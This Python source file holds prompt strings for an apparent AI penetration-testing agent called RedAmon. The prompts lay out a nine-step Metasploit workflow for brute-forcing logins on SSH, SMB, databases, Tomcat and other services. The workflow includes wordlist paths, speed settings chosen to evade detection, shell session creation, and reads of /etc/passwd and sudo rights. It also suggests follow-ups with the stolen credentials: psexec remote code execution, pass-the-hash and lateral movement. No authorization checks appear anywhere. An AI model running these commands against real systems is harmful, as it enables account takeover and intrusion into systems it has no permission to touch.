"""
RedAmon Brute Force Credential Guess Prompts

Prompts for brute force credential guess attack workflows.
"""

from .base import METASPLOIT_CONSOLE_HEADER


# =============================================================================
# BRUTE FORCE CREDENTIAL GUESS TOOLS (9-step workflow with verification)
# =============================================================================

BRUTE_FORCE_CREDENTIAL_GUESS_TOOLS = METASPLOIT_CONSOLE_HEADER + """
## ⚠️ ATTACK PATH: BRUTE FORCE CREDENTIAL GUESS ⚠️

**CRITICAL: This objective has been CLASSIFIED as brute force credential guessing.**
**You MUST follow the brute force workflow below. DO NOT switch to other attack methods.**

**IMPORTANT: Skip reconnaissance - go DIRECTLY to Step 1!**
- Do NOT query the graph for usernames or credentials
- Do NOT explore other services on the target
- Use the default wordlists provided in Step 4
- Start immediately with Step 1: Select the login scanner module

---

## MANDATORY BRUTE FORCE CREDENTIAL GUESS WORKFLOW

**This is the SINGLE SOURCE OF TRUTH for brute force credential guess attacks.**
**NEVER guess module names!** Use the appropriate protocol-specific login module.

Complete ALL 9 steps in order (ONE COMMAND PER CALL):

### Step 1: Select the login scanner module
Based on the target service:

| Service | Port | Module |
|---------|------|--------|
| SSH | 22 | `use auxiliary/scanner/ssh/ssh_login` |
| FTP | 21 | `use auxiliary/scanner/ftp/ftp_login` |
| Telnet | 23 | `use auxiliary/scanner/telnet/telnet_login` |
| SMB | 445 | `use auxiliary/scanner/smb/smb_login` |
| RDP | 3389 | `use auxiliary/scanner/rdp/rdp_scanner` |
| VNC | 5900 | `use auxiliary/scanner/vnc/vnc_login` |
| WinRM | 5985 | `use auxiliary/scanner/winrm/winrm_login` |
| MySQL | 3306 | `use auxiliary/scanner/mysql/mysql_login` |
| MSSQL | 1433 | `use auxiliary/scanner/mssql/mssql_login` |
| PostgreSQL | 5432 | `use auxiliary/scanner/postgres/postgres_login` |
| Oracle | 1521 | `use auxiliary/scanner/oracle/oracle_login` |
| MongoDB | 27017 | `use auxiliary/scanner/mongodb/mongodb_login` |
| Redis | 6379 | `use auxiliary/scanner/redis/redis_login` |
| POP3 | 110 | `use auxiliary/scanner/pop3/pop3_login` |
| IMAP | 143 | `use auxiliary/scanner/imap/imap_login` |
| SMTP | 25 | `use auxiliary/scanner/smtp/smtp_login` |
| HTTP Basic | 80/443 | `use auxiliary/scanner/http/http_login` |
| Tomcat Manager | 8080 | `use auxiliary/scanner/http/tomcat_mgr_login` |
| WordPress | 80/443 | `use auxiliary/scanner/http/wordpress_login_enum` |
| Jenkins | 8080 | `use auxiliary/scanner/http/jenkins_login` |

### Step 2: Show options
`show options` -> Display all configurable parameters

### Step 3: Set target
- `set RHOSTS <target-ip>` -> Target IP or range
- `set RPORT <port>` -> Target port (if non-default)

### Step 4: Configure credentials

**Choose ONE method based on available information:**

**Option A: Single credential test**
Use when you have specific credentials to try:
```
set USERNAME <user>
set PASSWORD <pass>
```

**Option B: User list with password list**
Use for comprehensive brute force:
```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

**Option C: Combined userpass file (username:password per line)**
Use for known credential pairs or service-specific defaults:
```
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
```

**Service-Specific Wordlist Recommendations:**
| Service | Recommended Wordlist | Description |
|---------|----------------------|-------------|
| SSH | `/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt` | SSH-specific username:password combos |
| Tomcat | `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt` | Tomcat Manager default credentials |
| MSSQL | `/usr/share/metasploit-framework/data/wordlists/mssql_default_userpass.txt` | MSSQL default credentials |
| PostgreSQL | `/usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt` | PostgreSQL default credentials |
| Oracle | `/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt` | Oracle DB default credentials |
| VNC | `/usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt` | Common VNC passwords (password only) |
| Quick Spray | `/usr/share/metasploit-framework/data/wordlists/burnett_top_1024.txt` | Top 1024 most common passwords |
| General Users | `/usr/share/metasploit-framework/data/wordlists/unix_users.txt` | Common Unix usernames |
| General Passwords | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` | Common Unix passwords |

**To list available wordlists:**
```
ls /usr/share/metasploit-framework/data/wordlists/
```

### Step 5: Set brute force options
```
set BRUTEFORCE_SPEED 3
set STOP_ON_SUCCESS true
```

**Speed settings:**
- 0: Very slow, stealthy (1 attempt per 30 seconds) - use to avoid detection/lockout
- 1-2: Slow, low profile
- 3: Medium speed (default, balanced) - recommended for most cases
- 4: Fast - may trigger account lockouts
- 5: Very fast - likely to trigger lockouts and detection

**STOP_ON_SUCCESS:** Set to `true` to stop immediately when valid credentials are found.

### Step 6: For SSH ONLY - Enable session creation
**CRITICAL for SSH brute force with post-exploitation!**
```
set CreateSession true
```
This creates a shell session when credentials are found.

**Note:** Only SSH supports automatic session creation. For other services (FTP, SMB, databases),
you get the credentials but no interactive session.

### Step 7: Execute
`run` -> **NOT "exploit"!**

The module runs synchronously. Wait for completion indicators in the output:
- `[*] Scanned X of Y hosts (100% complete)` -> Brute force finished
- `[+] <ip>:22 - Success: 'user:password'` -> Credentials found!
- `[*] SSH session X opened` -> Session created (if CreateSession=true)

### Step 8: Verify Session (MANDATORY after run)

**IMMEDIATELY after `run` completes, run:**
```
sessions -l
```

**Interpreting output:**
- If sessions listed (e.g., `1  shell linux  SSH user:pass...`): Note the session ID, proceed to Step 9
- If "No active sessions": Credentials may have been found but session failed - check Step 8b

### Step 8b: Verify Credentials (if no session)

If `sessions -l` shows no sessions, check credentials database:
```
creds
```

**Output format:** `host:port service public private realm private_type`
- If credentials listed: Attack succeeded, inform user of discovered credentials
- If no credentials: Attack failed, no valid credentials found

### Step 9: Post-Exploitation Transition

**If `sessions -l` shows active sessions:**
1. Request phase transition to `post_exploitation` using action="transition_phase"
2. Once in post-exploitation, use `sessions -i <id>` to interact with the shell
3. Use shell commands (NOT Meterpreter commands) - this is a SHELL session

**Shell session commands (after `sessions -i <id>`):**
```
whoami                -> Check current user
id                    -> User/group IDs
uname -a              -> System information
cat /etc/passwd       -> List users
sudo -l               -> Check sudo permissions
```

**If credentials found but NO session:**
- Use action="complete" to inform user of discovered credentials
- Credentials can be used for: manual SSH login, lateral movement, psexec, etc.

## CRITICAL: Commands NOT to use after brute force

| Command | Why NOT to use |
|---------|----------------|
| `jobs` | ssh_login runs in foreground, not as a background job |
| `notes` | Notes are for manual annotations, not brute force results |
| `vulns` | Brute force doesn't create vulnerability records |

## CREDENTIAL REUSE AFTER DISCOVERY

If credentials are found for non-SSH services (FTP, SMB, databases, web apps):
1. The attack is complete - credentials have been discovered
2. Inform the user of the discovered credentials
3. Credentials can be used for:
   - Direct service access (e.g., FTP client, database client)
   - Pass-the-hash attacks (SMB)
   - Further exploitation using the credentials
   - Lateral movement to other systems

**Example next steps after credential discovery:**
- **FTP:** Connect via FTP client, upload/download files
- **SMB:** Use `exploit/windows/smb/psexec` with discovered credentials for RCE
- **MySQL:** Connect via mysql client for data access
- **PostgreSQL:** Use `exploit/linux/postgres/postgres_payload` for RCE
- **Tomcat:** Use `exploit/multi/http/tomcat_mgr_upload` with discovered credentials

Use `action="complete"` after successfully discovering credentials.
"""


# =============================================================================
# BRUTE FORCE CREDENTIAL GUESS WORDLIST GUIDANCE
# =============================================================================

BRUTE_FORCE_CREDENTIAL_GUESS_WORDLIST_GUIDANCE = """
## Wordlist Selection Guide

### Built-in Metasploit Wordlists
Location: `/usr/share/metasploit-framework/data/wordlists/`

### General Purpose
| File | Description | Size |
|------|-------------|------|
| `unix_users.txt` | Common Unix usernames | ~170 entries |
| `unix_passwords.txt` | Common Unix passwords | ~1000 entries |
| `password.lst` | General password list | ~2000 entries |
| `burnett_top_1024.txt` | Top 1024 most common passwords | 1024 entries |
| `common_roots.txt` | Common root passwords | ~50 entries |

### Service-Specific
| File | Service | Description |
|------|---------|-------------|
| `piata_ssh_userpass.txt` | SSH | Username:password combos for SSH |
| `tomcat_mgr_default_userpass.txt` | Tomcat | Tomcat Manager defaults |
| `db2_default_userpass.txt` | IBM DB2 | DB2 default credentials |
| `oracle_default_userpass.txt` | Oracle | Oracle DB defaults |
| `postgres_default_userpass.txt` | PostgreSQL | PostgreSQL defaults |
| `mssql_default_userpass.txt` | MSSQL | Microsoft SQL Server defaults |
| `http_default_userpass.txt` | HTTP | HTTP Basic Auth defaults |
| `vnc_passwords.txt` | VNC | Common VNC passwords |
| `snmp_default_pass.txt` | SNMP | SNMP community strings |

### IoT/Embedded
| File | Description |
|------|-------------|
| `mirai_user.txt` | Mirai botnet usernames |
| `mirai_pass.txt` | Mirai botnet passwords |

### Wordlist Strategy

1. **Start with service-specific defaults** - Highest success rate for misconfigured services
2. **Try top passwords first** - `burnett_top_1024.txt` for quick wins
3. **Use targeted lists** - Match wordlist to service type
4. **Full brute force last** - `unix_users.txt` + `unix_passwords.txt` if defaults fail

### Custom Wordlists
If built-in wordlists are insufficient, you can specify custom paths:
```
set USER_FILE /path/to/custom_users.txt
set PASS_FILE /path/to/custom_passwords.txt
```
"""
